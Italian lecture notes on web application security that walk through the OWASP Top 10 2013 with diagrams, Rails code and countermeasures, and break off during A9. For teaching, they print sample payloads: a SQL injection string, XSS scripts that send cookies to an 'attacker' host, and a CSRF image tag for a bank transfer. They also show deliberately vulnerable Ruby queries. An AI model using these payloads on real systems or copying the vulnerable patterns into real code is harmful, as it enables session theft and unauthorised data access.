---
title: Sicurezza delle Web Application
aliases:
  - LASS — Sicurezza delle Web Application
tags:
  - lab-architetture-software-sicurezza
  - sicurezza
  - web-security
  - owasp
source: 17 - Web application security.pdf
---

# Problemi di sicurezza comuni nelle web app

> [!abstract]
> Risponde all'ultima domanda di [[13 - LASS - Introduzione alla Sicurezza#Next…|lezione 13]]: **come ci si difende dagli attacchi più comuni?** La guida è l'**OWASP Top 10** (edizione 2013): come una vulnerabilità diventa un attacco, come si valuta il rischio, e poi le dieci categorie una per una, ciascuna con descrizione, impatto tipico, un esempio illustrato e le contromisure: **Injection**, **Broken Authentication and Session Management**, **Cross-Site Scripting**, **Insecure Direct Object References**, **Security Misconfiguration**, **Sensitive Data Exposure**, **Missing Function Level Access Control**, **Cross-Site Request Forgery**, **Using Known Vulnerable Components**, **Unvalidated Redirects and Forwards**.
>
> Molte categorie toccano direttamente il codice Rails delle lezioni [[05 - LASS - Rails Parte 1|5]]–[[07 - LASS - Rails Parte 3|7]] (query Active Record, view ERB, filtri, `redirect_to`) e l'autenticazione di [[14 - LASS - Autenticazione]]: nelle note qui sotto è indicato come Rails aiuta (o no). Approfondimenti offensivi in Ethical Hacking: [[Web Application Hacking]], [[SQL Injection]], [[Command Injection]], [[Session Management]], [[Authorization]], [[Input Validation]]; lato database, [[SQL Injection (Basi di Dati)]].
>
> Indice dei concetti: [[MOC - Lab Architetture Software e Sicurezza]].

---

## Premessa: OWASP Top 10

Vedi [[OWASP Top 10]].

Molte delle slide provengono dal sito **OWASP** (*Open Web Application Security Project*, owasp.org), progetto *OWASP Top-10*.

- L'OWASP Top 10 è un documento **orientato alla consapevolezza** (*awareness*): **non è uno standard**.
- Prima edizione nel **2003**; poi 2004, 2007, 2010, **2013** (l'edizione usata nelle slide).
- Fornisce **schede riassuntive** sui **10 rischi più comuni** a cui sono esposte le applicazioni web. Per ciascuno dettaglia:
  - il **livello di rischio** prevedibile;
  - come il rischio può essere **giustificato dalla presenza di una vulnerabilità**;
  - quali **contromisure** adottare per eliminare o contenere il rischio.

### Come una vulnerabilità diventa un attacco

![[LASS-L17-p04.png]]

Il diagramma OWASP *"What Are Application Security Risks?"* legge da sinistra a destra il percorso di un attacco:
- **threat agents**: chi attacca (gli omini);
- **attack vectors**: il modo in cui attacca (una richiesta HTTP manipolata, un'email…);
- **security weaknesses**: la debolezza dell'applicazione che l'attacco sfrutta;
- **security controls**: i controlli di sicurezza che dovrebbero fermarlo (possono mancare o essere aggirati);
- **technical impacts**: cosa viene colpito, un **asset** (dati) o una **function** (funzionalità);
- **business impacts**: il danno per l'organizzazione.

Il percorso evidenziato in rosso è un attacco riuscito: trova una debolezza **senza controllo** (o con un controllo inefficace), raggiunge una funzione e produce un impatto. Gli altri percorsi (arancioni) sono fermati dai controlli o non portano a impatti. Ogni percorso è un **rischio**, che può essere più o meno serio: a volte è banale da trovare e sfruttare, a volte difficilissimo; il danno può essere trascurabile o mandare fuori mercato l'azienda. Il rischio complessivo si ottiene combinando la **probabilità** (agente, vettore, debolezza) con l'**impatto** tecnico e di business.

### La scala di rischio

![[LASS-L17-p05.png]]

Per ogni rischio la Top 10 usa una **scala semplice** (basata sulla *OWASP Risk Rating Methodology*) che valuta:
- la **semplicità di sfruttamento** da parte di un attaccante (*attack vectors*: Easy / Average / Difficult);
- la **prevalenza globale** della debolezza (*weakness prevalence*: Widespread / Common / Uncommon);
- la **semplicità di identificazione** (*weakness detectability*: Easy / Average / Difficult);
- l'**impatto** tecnico (*technical impacts*: Severe / Moderate / Minor).

Le colonne *threat agents* e *business impacts* sono marcate **"App Specific"** / **"App / Business Specific"**: dipendono dal contesto, e solo chi conosce l'applicazione e l'azienda può valutarle. Rosso = rischio maggiore, giallo = minore.

### Le dieci categorie (2013)

![[LASS-L17-p06.png]]

| # | Categoria |
|---|---|
| A1 | Injection |
| A2 | Broken Authentication and Session Management |
| A3 | Cross-Site Scripting (XSS) |
| A4 | Insecure Direct Object References |
| A5 | Security Misconfiguration |
| A6 | Sensitive Data Exposure |
| A7 | Missing Function Level Access Control |
| A8 | Cross Site Request Forgery (CSRF) |
| A9 | Using Known Vulnerable Components |
| A10 | Unvalidated Redirects and Forwards |

> [!note] Aggiornamento: le edizioni successive
> Dopo il 2013 sono uscite le edizioni **2017**, **2021** e **2025**. Nel 2021 le categorie sono state riorganizzate: A4 e A7 sono confluite in **A01 Broken Access Control** (oggi al primo posto), XSS è stato assorbito in **A03 Injection**, A6 è diventata **A02 Cryptographic Failures**, A2 è diventata **A07 Identification and Authentication Failures**, A9 è **A06 Vulnerable and Outdated Components**; CSRF e redirect non compaiono più come categorie proprie (in buona parte perché i framework moderni, Rails compreso, li mitigano per default). Sono comparse categorie nuove come **Insecure Design** e **Server-Side Request Forgery (SSRF)**. I concetti delle slide restano tutti validi.

## A1 – Injection

Vedi [[SQL Injection]] e [[Prepared Statement]].

**Injection** significa…
- **ingannare un'applicazione** inducendola a includere **comandi non voluti nei dati inviati a un interprete**.

Gli **interpreti**…
- prendono **stringhe** e le **interpretano come comandi**;
- SQL, shell del sistema operativo, LDAP, XPath, Hibernate, ecc.

La **SQL injection** è ancora piuttosto comune:
- molte applicazioni sono ancora vulnerabili (non si sa davvero perché);
- anche se di solito è **molto semplice da evitare**.

**Impatto tipico**:
- di solito **grave**: si può leggere o modificare **l'intero database**;
- può anche permettere di ottenere lo **schema completo** del database, l'accesso agli account, o persino un accesso **a livello di sistema operativo**.

### SQL Injection illustrata

![[LASS-L17-p08.png]]

La figura mostra a sinistra gli strati di un sistema (rete con firewall e sistema operativo "hardened" in basso, poi web server, app server e codice applicativo, con le funzioni di business in alto) e a destra i passi dell'attacco:
1. l'applicazione presenta un **form** all'attaccante (campi *Account* e *SKU*);
2. l'attaccante invia un attacco nei dati del form: nel campo account scrive `' OR 1=1--`;
3. l'applicazione **inoltra l'attacco al database** dentro una query SQL: `SELECT * FROM accounts WHERE acct='' OR 1=1--'`;
4. il database esegue la query contenente l'attacco e restituisce i risultati (cifrati) all'applicazione;
5. l'applicazione decifra i dati normalmente e li manda all'utente.

Il risultato è la tabella con **tutti i numeri di conto** (`Acct:5424-6066-2134-4334`, …). Perché: l'apice `'` chiude la stringa, `OR 1=1` rende la condizione sempre vera (quindi la `WHERE` seleziona tutte le righe), `--` commenta l'apice finale aggiunto dall'applicazione. La richiesta HTTP è legittima per il firewall: l'attacco passa attraverso tutte le difese di rete (vedi [[13 - LASS - Introduzione alla Sicurezza#Perché la sicurezza applicativa|lezione 13]]).

### Evitare le injection

**Raccomandazioni**:
- **evitare del tutto l'interprete**, oppure
- usare un'interfaccia che supporti le **bind variable** (es. **prepared statement** o **stored procedure**):
  - le bind variable permettono all'interprete di **distinguere tra codice e dati**;
- **codificare** (*encode*) tutto l'input dell'utente prima di passarlo all'interprete;
- fare sempre **validazione "white list"** di tutto l'input fornito dall'utente (accettare solo ciò che si sa essere valido, invece di cercare di bloccare ciò che è pericoloso);
- **minimizzare i privilegi** del database per ridurre l'impatto di una falla (principio del [[13 - LASS - Introduzione alla Sicurezza#Reduce Vulnerabilities|minimo privilegio]]).

Dettagli: *OWASP SQL Injection Prevention Cheat Sheet*.

```ruby
# VULNERABILE: il parametro diventa parte del codice SQL
Movie.where("title = '#{params[:title]}'")

# SICURO: il parametro viene passato come dato (bind variable)
Movie.where("title = ?", params[:title])
Movie.where(title: params[:title])
Movie.find_by(title: params[:title])
```

In Rails le query Active Record con hash o con segnaposto `?` usano già i parametri: l'injection nasce solo quando si costruisce SQL con l'interpolazione di stringhe (vedi [[07 - LASS - Rails Parte 3#ActiveRecord Query Interface|lezione 7]]).

## A2 – Broken Authentication and Session Management

Vedi [[Broken Authentication e Session Management]].

HTTP è un protocollo **"stateless"** (vedi [[04 - LASS - SaaS Essentials#HTTP è stateless: i cookie|lezione 4]]):
- significa che le **credenziali devono accompagnare ogni richiesta**;
- bisognerebbe usare **SSL** (oggi TLS) per **tutto ciò che richiede autenticazione**.

**Falle nella gestione delle sessioni**:
- il **SESSION ID** è usato per tenere traccia dello stato, visto che HTTP non lo fa;
- **per un attaccante vale quanto le credenziali** (chi ha il session ID è l'utente);
- il SESSION ID è tipicamente **esposto** sulla rete, nel browser, nei log, …

**Attenzione alle porte laterali** (*side-doors*):
- cambia password, ricorda la password, password dimenticata, domanda segreta, logout, indirizzo email, ecc. (vedi "password reset is the new login" in [[14 - LASS - Autenticazione#Il risultato|lezione 14]]).

**Impatto tipico**: account utente compromessi o **sessioni utente dirottate** (*session hijacking*).

### Broken Authentication illustrata

![[LASS-L17-p11.png]]

1. L'utente invia le credenziali.
2. Il sito usa l'**URL rewriting**, cioè **mette la sessione nell'URL**: `www.boi.com?JSESSIONID=9FA1DB9EA...`.
3. L'utente clicca su un forum un link a `http://www.hacker.com`.
4. L'hacker controlla i **log dei referrer** su `www.hacker.com` (il browser, seguendo il link, invia nell'header `Referer` l'URL della pagina di provenienza, **compreso il session ID**) e trova il `JSESSIONID` dell'utente.
5. L'hacker usa il `JSESSIONID` e **prende il controllo dell'account** della vittima.

### Contromisure

**Verificare l'architettura**:
- l'autenticazione deve essere **semplice, centralizzata e standardizzata**;
- usare il **session ID standard** fornito dal container (il framework), non inventarne uno;
- assicurarsi che **SSL protegga sempre** sia le credenziali sia il session ID.

**Verificare l'implementazione**:
- lasciar perdere gli approcci di analisi automatica (non trovano questi problemi);
- controllare il **certificato SSL**;
- esaminare **tutte le funzioni legate all'autenticazione**;
- verificare che il **logout distrugga davvero la sessione**;
- usare **WebScarab** di OWASP per testare l'implementazione (oggi sostituito da **OWASP ZAP**).

Seguire le indicazioni dell'*OWASP Authentication Cheat Sheet*.

> [!tip] In Rails
> Rails mette la sessione in un **cookie** (mai nell'URL), firmato e cifrato. Buone pratiche: forzare HTTPS (`config.force_ssl = true`, che rende anche i cookie `secure`), chiamare `reset_session` al login (contro la *session fixation*) e al logout, salvare le password con `has_secure_password` ([[14 - LASS - Autenticazione#BCrypt|bcrypt]]).

## A3 – Cross-Site Scripting (XSS)

Vedi [[Cross-Site Scripting]].

Si verifica ogni volta che…
- **dati grezzi forniti da un attaccante vengono inviati al browser di un utente innocente**.

Dati grezzi…
- **memorizzati nel database** (**XSS persistente**, o *stored*);
- **riflessi dal client** (**XSS riflesso**, o *reflected*).

Moltissime web application hanno questo problema.

**Impatto tipico**:
- rubare la **sessione** dell'utente, rubare **dati sensibili**, **riscrivere** la pagina web, **reindirizzare** l'utente a un sito di phishing o malware;
- il più grave: installare un **proxy XSS** che permette all'attaccante di **osservare e dirigere tutto il comportamento dell'utente** sul sito vulnerabile e di forzarlo verso altri siti.

### XSS persistente

![[LASS-L17-p14.png]]

Esempio da excess-xss.com:
1. l'attaccante, dal suo browser, invia un commento al sito (`POST http://website/post-comment`) che contiene uno **script**; il sito lo salva nel **database** come `latestComment`: `<script>window.location='http://attacker/?cookie='+document.cookie</script>`;
2. la vittima visita la pagina degli ultimi commenti (`GET http://website/latest-comment`);
3. il sito risponde `200 OK` con una pagina generata da uno script che stampa il commento **così com'è** (`print database.latestComment`): nella pagina della vittima c'è ora il tag `<script>`;
4. il browser della vittima **esegue lo script**, che la porta a `http://attacker/?cookie=...` passando il suo **cookie di sessione**: l'attaccante può ora impersonarla (A2).

È esattamente ciò che faceva l'attacco iniziale di [[13 - LASS - Introduzione alla Sicurezza#Introduzione - cos'è questo|lezione 13]], su scala di massa.

### XSS riflesso

![[LASS-L17-p15.png]]

1. L'attaccante fa arrivare alla vittima un link (*"Check this out!"*): `http://website/search?keyword=<script>...</script>`;
2. la vittima clicca, e il suo browser fa la richiesta `GET http://website/search?keyword=<script>...</script>`;
3. il sito risponde `200 OK` con una pagina che **riflette** il parametro: `print "You searched for:" ; print request.query['keyword']`. La pagina contiene lo script dell'attaccante;
4. il browser della vittima esegue lo script, che manda il cookie all'attaccante (`GET http://attacker/?cookie=sensitive-data`).

La differenza: nel riflesso lo script **non viene salvato** sul sito, viaggia nel link e colpisce solo chi lo clicca; nel persistente colpisce **chiunque** visiti la pagina.

### Evitare le falle XSS

**Raccomandazioni**:
- **eliminare la falla**: non includere input fornito dall'utente nella pagina di output;
- **difendersi dalla falla**:
  - usare la **Content Security Policy (CSP)**: un header HTTP che dice al browser da quali sorgenti può caricare ed eseguire script (es. vietare gli script inline);
  - **raccomandazione principale**: fare l'**output encoding** di tutto l'input fornito dall'utente (con gli encoder ESAPI di OWASP o gli encoder Java);
  - fare **validazione white list** di tutto l'input che finirà nella pagina;
  - per grandi porzioni di **HTML fornito dall'utente** (es. un editor di testo ricco), usare **AntiSamy** di OWASP per **sanificarlo**.

Riferimento: *OWASP XSS (Cross Site Scripting) Prevention Cheat Sheet*.

### Schemi di escaping sicuri nei diversi contesti HTML

![[LASS-L17-p17.png]]

La codifica corretta **dipende da dove** il dato non fidato viene inserito nella pagina:

| # | Contesto | Esempio | Codifica | Funzione ESAPI |
|---|---|---|---|---|
| 1 | **contenuto di un elemento HTML** | `<div> some text to display </div>` | `& < > "` → `&entity;`, `' /` → `&#xHH;` | `encodeForHTML()` |
| 2 | **valore di un attributo HTML** | `<input name='person' type='TEXT' value='defaultValue'>` | tutti i non alfanumerici < 256 → `&#xHH;` | `encodeForHTMLAttribute()` |
| 3 | **dati JavaScript** | `<script>someFunction('DATA')</script>` | tutti i non alfanumerici < 256 → `\xHH` | `encodeForJavaScript()` |
| 4 | **valori di proprietà CSS** | `.pdiv a:hover {color: red; text-decoration: underline}` | tutti i non alfanumerici < 256 → `\HH` | `encodeForCSS()` |
| 5 | **valori di attributi URI** | `<a href="http://site.com?search=DATA">` | tutti i non alfanumerici < 256 → `%HH` | `encodeForURL()` |

**Tutti gli altri contesti NON POSSONO contenere dati non fidati.** Raccomandazione: **ammettere solo i casi #1 e #2** e vietare tutti gli altri (inserire dati utente dentro uno script o un CSS è troppo rischioso).

Esempio del caso #1: se un utente sceglie come nome `<script>alert(1)</script>`, la codifica HTML lo trasforma in `&lt;script&gt;alert(1)&lt;/script&gt;`, che il browser **mostra** come testo invece di eseguirlo.

> [!tip] In Rails
> Le view ERB fanno **automaticamente** l'escaping HTML (caso #1) di tutto ciò che esce da `<%= %>` (vedi [[06 - LASS - Rails Parte 2#Controllers and Views|lezione 6]]). Il pericolo nasce quando lo si disattiva con `raw`, `html_safe` o `<%== %>`: vanno usati solo su contenuti fidati, oppure dopo `sanitize`. Rails supporta anche la CSP (`content_security_policy` nella configurazione).

## A4 – Insecure Direct Object References

Vedi [[Insecure Direct Object Reference]].

Come si protegge l'accesso ai propri dati?
- Fa parte del corretto **controllo di autorizzazione**, insieme ad A7 (*Failure to Restrict URL Access*, il nome di A7 nell'edizione 2010).

Un errore comune…
- mostrare **solo gli oggetti "autorizzati"** per l'utente corrente, oppure
- **nascondere i riferimenti agli oggetti** in campi nascosti (*hidden fields*),
- … e poi **non far rispettare queste restrizioni lato server**;
- si chiama **controllo degli accessi a livello di presentazione** (*presentation layer access control*), e **non funziona**;
- l'attaccante semplicemente **manipola il valore del parametro**.

**Impatto tipico**: gli utenti accedono a **file o dati non autorizzati**.

### Insecure Direct Object References illustrata

![[LASS-L17-p19.png]]

- L'attaccante nota che il suo parametro `acct` è **6065**: `https://www.onlinebank.com/user?acct=6065`;
- lo **modifica** in un numero vicino: `?acct=6066`;
- l'attaccante **vede le informazioni del conto della vittima**.

Il server ha controllato che l'utente fosse **autenticato**, ma non che il conto 6066 fosse **suo**.

### Contromisure

![[LASS-L17-p20.png]]

**Eliminare il riferimento diretto all'oggetto**:
- sostituirlo con un **valore di mappatura temporaneo** (es. 1, 2, 3): invece di `http://app?file=Report123.xls` l'utente vede `http://app?file=1`; invece di `http://app?id=9182374` vede `http://app?id=7d3J93`. Una **access reference map** sul server, specifica per l'utente (o la sessione), traduce `1` in `Report123.xls` e `7d3J93` in `Acct:9182374`. L'utente non può "indovinare" i riferimenti degli altri, perché la sua mappa contiene solo i suoi.

**Validare il riferimento diretto**:
- verificare che il valore del parametro sia **correttamente formattato**;
- verificare che l'utente sia **autorizzato ad accedere** all'oggetto richiesto;
  - i **vincoli nella query** funzionano benissimo (vedi l'esempio Rails sotto);
- verificare che la **modalità di accesso** richiesta sia ammessa sull'oggetto (es. lettura, scrittura, cancellazione).

```ruby
# VULNERABILE: qualunque utente loggato può vedere qualunque recensione
@review = Review.find(params[:id])

# SICURO: il vincolo è nella query, si cerca solo tra le recensioni dell'utente
@review = @current_user.reviews.find(params[:id])   # RecordNotFound se non è sua
```

È il caso della route RESTful `/user/301/cart` di [[04 - LASS - SaaS Essentials#RESTful URI|lezione 4]]: rendere la richiesta autosufficiente non basta, il server deve controllare che l'utente sia proprio il 301.

## A5 – Security Misconfiguration

Vedi [[Security Misconfiguration]].

Le web application si basano su **fondamenta sicure**:
- **ovunque**, dal sistema operativo fino all'application server.

Il vostro **codice sorgente è segreto**?
- pensate a **tutti i posti** in cui va il codice sorgente (repository, macchine degli sviluppatori, server di test, backup…);
- **la sicurezza non deve richiedere che il codice sorgente sia segreto** (è il principio di Kerckhoffs applicato al software).

La **gestione della configurazione** (*configuration management*, CM) deve estendersi a **tutte le parti** dell'applicazione:
- **tutte le credenziali devono cambiare in produzione** (niente password di default o di sviluppo).

**Impatto tipico**:
- installazione di una **backdoor** sfruttando una **patch mancante** del sistema operativo o del server;
- accesso non autorizzato ad **account di default**, a funzionalità o dati dell'applicazione, o a **funzionalità inutilizzate ma accessibili**, a causa di una cattiva configurazione del server.

![[LASS-L17-p22.png]]

La figura mostra la pila dell'applicazione (sistema operativo hardened, web server, app server, framework, configurazione dell'app, codice, database e funzioni di business) e, a destra, tutti i posti **fuori produzione** in cui finiscono configurazione e codice: **development**, **QA servers**, **test servers**, **source control**. Un **insider** (o chiunque acceda a uno di quei sistemi) può trovare lì credenziali, chiavi e informazioni per attaccare la produzione: la configurazione va protetta ovunque, non solo sul server di produzione.

### Contromisure

**Verificare la gestione della configurazione** del sistema:
- linee guida di **"hardening"** della configurazione sicura;
  - l'**automazione è DAVVERO UTILE** qui;
- deve coprire **l'intera piattaforma e l'applicazione**;
- analizzare gli **effetti sulla sicurezza dei cambiamenti**.

Si riesce a **"scaricare" (dump) la configurazione** dell'applicazione?
- inserire la **reportistica** nel processo;
- **se non si può verificare, non è sicuro**.

**Verificare l'implementazione**:
- la **scansione** trova i problemi generici di configurazione e le patch mancanti.

> [!tip] In Rails
> Errori tipici: lasciare l'app in ambiente *development* in produzione (mostra pagine di errore con codice e variabili a chiunque), committare su git `config/master.key` o le API key ([[04 - LASS - SaaS Essentials#Autorizzazione delle API|lezione 4]]), lasciare attive route di debug. Le credenziali vanno in `rails credentials` o in variabili d'ambiente.

## A6 – Sensitive Data Exposure

Vedi [[Sensitive Data Exposure]].

**Memorizzare e trasmettere dati sensibili in modo insicuro**:
- non riuscire a **identificare tutti i dati sensibili**;
- non riuscire a identificare **tutti i posti in cui questi dati vengono memorizzati**:
  - database, file, directory, **file di log**, **backup**, ecc.;
- non riuscire a identificare **tutti i posti in cui vengono inviati**:
  - sul web, ai database di backend, ai partner commerciali, nelle comunicazioni interne;
- non riuscire a **proteggerli adeguatamente in ogni posto**.

**Impatto tipico**:
- gli attaccanti accedono a informazioni riservate o private, o le modificano: carte di credito, cartelle cliniche, dati finanziari (vostri o dei clienti);
- gli attaccanti estraggono **segreti da usare in altri attacchi**;
- **imbarazzo** per l'azienda, insoddisfazione dei clienti e **perdita di fiducia**;
- **costi** per gestire l'incidente: analisi forense, lettere di scuse, riemissione di migliaia di carte di credito, assicurazioni contro il furto d'identità;
- l'azienda viene **citata in giudizio** e/o **multata** (oggi, in Europa, il GDPR prevede sanzioni fino al 4% del fatturato).

La categoria unisce due voci dell'edizione 2010: *Insecure Cryptographic Storage* (dati a riposo) e *Insufficient Transport Layer Protection* (dati in transito), illustrate di seguito.

### Insecure Cryptographic Storage

![[LASS-L17-p25.png]]

1. La vittima inserisce il **numero di carta di credito** in un form.
2. Il gestore degli errori **scrive nei log i dettagli della carta**, perché il gateway di pagamento non è disponibile.
3. I **log sono accessibili a tutti i membri dello staff IT** per il debugging.
4. Un **insider malintenzionato** ruba **4 milioni di numeri di carta**.

Il database poteva anche essere cifrato perfettamente: i dati sono usciti da un posto che nessuno aveva considerato (i log).

**Evitarlo — verificare l'architettura**:
- identificare **tutti i dati sensibili**;
- identificare **tutti i posti** in cui sono memorizzati;
- assicurarsi che il **modello delle minacce** (*threat model*) tenga conto dei possibili attacchi;
- usare la cifratura per **contrastare le minacce**, non solo per "cifrare" i dati (cifrare il disco non protegge da chi accede tramite l'applicazione).

**Proteggere con meccanismi appropriati**: cifratura dei file, del database, dei singoli dati.

**Usare i meccanismi correttamente**:
- usare **algoritmi standard robusti** (mai inventarne di propri);
- **generare, distribuire e proteggere** le chiavi correttamente;
- essere pronti al **cambio delle chiavi**.

**Verificare l'implementazione**:
- si usa un algoritmo standard robusto, ed è **quello giusto** per la situazione (es. per le password una funzione lenta come [[14 - LASS - Autenticazione#Soluzione 5 - bcrypt con salt|bcrypt]], non una cifratura reversibile);
- tutte le chiavi, i certificati e le password sono **memorizzati e protetti** adeguatamente;
- sono in atto una **distribuzione sicura delle chiavi** e un piano efficace per il loro **cambio**;
- **analizzare il codice di cifratura** alla ricerca di errori comuni.

> [!tip] In Rails
> `config.filter_parameters` (che di default contiene `:password` e altri campi sensibili) impedisce che quei parametri finiscano in chiaro nei log: è esattamente la difesa contro lo scenario della figura. Per cifrare singole colonne del database c'è `encrypts :campo` (Active Record Encryption, da Rails 7).

### Insufficient Transport Layer Protection

![[LASS-L17-p28.png]]

La vittima esterna comunica con il codice dell'applicazione, che a sua volta parla con i **sistemi di backend**, i **partner commerciali** e i **dipendenti**. Due minacce:
1. un **attaccante esterno** ruba credenziali e dati **dalla rete** (es. sulla Wi-Fi pubblica tra la vittima e il sito);
2. un **attaccante interno** ruba credenziali e dati **dalla rete interna** (tra l'applicazione e il backend, spesso lasciata in chiaro perché "tanto è interna").

**Evitarlo — proteggere con meccanismi appropriati**:
- usare **TLS su tutte le connessioni** con dati sensibili (anche quelle interne);
- usare **HSTS** (*HTTP Strict Transport Security*): un header che dice al browser di usare **sempre** HTTPS per quel sito, impedendo il declassamento a HTTP;
- usare il **key pinning** (associare al sito una chiave pubblica precisa);
- **cifrare individualmente i messaggi** prima della trasmissione (es. XML-Encryption);
- **firmare i messaggi** prima della trasmissione (es. XML-Signature).

**Usare i meccanismi correttamente**:
- usare **algoritmi standard robusti** (disabilitare i vecchi algoritmi SSL);
- gestire correttamente chiavi e certificati;
- **verificare i certificati SSL** prima di usarli;
- usare **meccanismi collaudati** quando sufficienti.

> [!note]
> Il *key pinning* per HTTP (HPKP) è stato abbandonato dai browser (era facile bloccarsi fuori dal proprio sito sbagliando configurazione); oggi si usa soprattutto nelle app mobili. HSTS invece è raccomandato.

## A7 – Missing Function Level Access Control

Vedi [[Missing Function Level Access Control]].

Come si protegge l'accesso agli **URL** (pagine)? O alle **funzioni** referenziate da un URL più dei parametri?
- Fa parte del corretto controllo di **autorizzazione**, insieme ad A4 (*Insecure Direct Object References*).

Un errore comune…
- **mostrare solo i link e le voci di menu autorizzati**;
- anche questo è **controllo degli accessi a livello di presentazione**, e **non funziona**;
- l'attaccante **forgia un accesso diretto** alle pagine "non autorizzate".

**Impatto tipico**:
- gli attaccanti invocano **funzioni e servizi** per cui non sono autorizzati;
- accedono agli **account e ai dati di altri utenti**;
- compiono **azioni privilegiate**.

![[LASS-L17-p31.png]]

- L'attaccante nota che l'URL indica il suo **ruolo**: `/user/getAccounts`;
- lo **modifica** verso un'altra directory (ruolo): `/admin/getAccounts` o `/manager/getAccounts`;
- l'attaccante vede **più account** dei soli suoi.

La differenza con A4: in A4 si accede a un **oggetto** di un altro utente (il conto 6066), in A7 a una **funzione** riservata a un altro ruolo (la pagina dell'amministratore).

### Contromisure

Per ogni funzione, un sito deve fare **3 cose**:
- **limitare l'accesso agli utenti autenticati** (se non è pubblica);
- **far rispettare i permessi** basati sull'utente o sul ruolo (se è privata);
- **vietare completamente le richieste** a tipi di pagina non autorizzati (es. file di configurazione, di log, sorgenti, ecc.).

**Verificare l'architettura**:
- usare un **modello semplice e positivo** a ogni livello (*deny by default*: tutto è vietato tranne ciò che è esplicitamente permesso);
- assicurarsi di **avere davvero un meccanismo** a ogni livello.

**Verificare l'implementazione**:
- lasciar perdere gli approcci di analisi automatica;
- verificare che **ogni URL** (con i suoi parametri) che fa riferimento a una funzione sia protetto da:
  - un **filtro esterno**, come `web.xml` di Java EE o un prodotto commerciale;
  - oppure **controlli interni nel vostro codice**, es. il metodo `isAuthorizedForURL()` di ESAPI;
- verificare che la configurazione del server **vieti le richieste** ai tipi di file non autorizzati;
- usare **OWASP ZAP** o il proprio browser per **forgiare richieste non autorizzate**.

> [!tip] In Rails
> Il meccanismo è il [[06 - LASS - Rails Parte 2#Controller Filters|controller filter]]: un `before_action` in `ApplicationController` che richiede il login per tutte le azioni (*deny by default*), più filtri per ruolo nei controller riservati (`before_action :require_admin`). Gem come Pundit o CanCanCan centralizzano le regole. Il bug del filtro con `where` visto nelle lezioni 6 e 7 è proprio un caso di A7: il controllo c'era, ma non scattava mai. E i **sad path** di Cucumber ([[08 - LASS - Behavior-Driven Development#Gherkin Example|lezione 8]]) sono un ottimo modo per testarlo.

## A8 – Cross Site Request Forgery (CSRF)

Vedi [[Cross-Site Request Forgery]].

**Cross Site Request Forgery**:
- un attacco in cui il **browser della vittima viene ingannato** e indotto a inviare un **comando** a una web application vulnerabile;
- la vulnerabilità è causata dal fatto che i **browser includono automaticamente i dati di autenticazione** dell'utente (session ID, indirizzo IP, credenziali di dominio Windows, …) in **ogni richiesta**.

Immaginate…
- se un hacker potesse **guidare il vostro mouse** e farvi cliccare dei link nella vostra applicazione di home banking?
- cosa potrebbe farvi fare?

**Impatto tipico**:
- avviare **transazioni** (trasferire fondi, fare logout dell'utente, chiudere il conto);
- accedere a **dati sensibili**;
- modificare i **dettagli dell'account**.

### Lo schema della vulnerabilità

**Il problema**:
- i browser **includono automaticamente la maggior parte delle credenziali** in ogni richiesta;
- anche per le richieste causate da un **form, uno script o un'immagine su un altro sito**.

**Condizioni necessarie** per un attacco CSRF:
- **un'azione rilevante**: un'azione sul sito vulnerabile che l'attaccante ha interesse a far eseguire;
- **gestione della sessione basata sui cookie**: l'autenticazione si basa **solo** su session ID o token nei cookie;
  - **che il browser invia automaticamente!**
- **nessun parametro imprevedibile** nella richiesta: l'attaccante conosce tutto ciò che serve per fare la richiesta.

### CSRF illustrato

![[LASS-L17-p35.png]]

1. L'attaccante **piazza la trappola** su un qualche sito Internet (o semplicemente via **email**): un **tag `<img>` nascosto** che contiene l'attacco contro il sito vulnerabile, ad esempio `<img src="https://bank.com/transfer?to=attacker&amount=1000" width="0">`.
2. **Mentre è loggata al sito vulnerabile**, la vittima visita il sito dell'attaccante.
3. Il browser carica il tag `<img>`, cioè **invia una richiesta GET** al sito vulnerabile, **includendo le credenziali** (il cookie di sessione). Il sito vulnerabile vede una **richiesta legittima della vittima** ed esegue l'azione.

L'attaccante non vede mai il cookie: si limita a far sì che sia il browser della vittima a usarlo. È anche il motivo per cui una `GET` [[04 - LASS - SaaS Essentials#HTTP Route|non deve mai avere effetti collaterali]].

### Evitare le falle CSRF

Aggiungere a **TUTTE le richieste sensibili** un **token segreto, non inviato automaticamente** dal browser:
- rende **impossibile all'attaccante falsificare la richiesta**, perché non conosce il token
  - (a meno che non ci sia una falla **XSS** nell'applicazione: uno script iniettato nella pagina può leggere il token);
- i token devono essere **crittograficamente robusti o casuali**.

**Opzioni**:
- memorizzare **un singolo token nella sessione** e aggiungerlo a **tutti i form e i link**:
  - **campo nascosto**: `<input name="token" value="687965fdfaew87agrde" type="hidden"/>`;
  - **URL monouso**: `/accounts/687965fdfaew87agrde`;
  - **token nel form**: `/accounts?auth=687965fdfaew87agrde …`;
- attenzione a **esporre il token nell'header `Referer`** (se è nell'URL, finisce nei log dei siti esterni, come il session ID di A2);
  - si raccomandano i **campi nascosti**;
- si può avere un **token diverso per ogni funzione**:
  - usando un **hash** del nome della funzione, del session ID e di un segreto;
- si può richiedere una **seconda autenticazione** per le funzioni sensibili (es. eTrade chiede di nuovo la password o un codice per i bonifici).

**Non permettere agli attaccanti di memorizzare attacchi sul vostro sito**:
- **codificare correttamente tutto l'input in uscita** (vedi A3);
- questo rende **inerti** tutti i link/richieste nella maggior parte degli interpreti.

Dettagli: *OWASP CSRF Prevention Cheat Sheet*.

> [!tip] In Rails
> Rails implementa il token per default: `protect_from_forgery` (attivo in `ActionController::Base`) richiede un **authenticity token** in ogni richiesta non-GET; i form helper (`form_tag`, `form_with`, vedi [[06 - LASS - Rails Parte 2#Form Tag Helper|lezione 6]]) aggiungono da soli un campo nascosto `authenticity_token`, e il layout include `csrf_meta_tags` per le richieste AJAX. Va però rispettata la regola che le azioni con effetti non siano raggiungibili via GET, cosa che le route RESTful fanno già.

## A9 – Using Known Vulnerable Components

Vedi [[Using Known Vulnerable Components]].

![[LASS-L17-p37.png]]

**"Tutti usano librerie vulnerabili."** Il grafico (studio di Aspect Security / Sonatype sul repository Maven Central) mostra, su scala logaritmica, i **download** di librerie Java popolari (GWT, Struts 1.x, Apache Axis, Wicket, BouncyCastle, Apache Shiro…): **29 milioni di download di versioni vulnerabili nel 2011**. I numeri dello studio: 31 librerie, 1.261 versioni, 61.807 organizzazioni, 113.939.358 download. Il grafico a torta: il **26%** dei download riguardava versioni con **vulnerabilità note**, il 74% versioni senza vulnerabilità note.

I componenti vulnerabili sono **comuni**:
- alcuni componenti vulnerabili (es. librerie di framework) possono essere **identificati e sfruttati con strumenti automatici**;
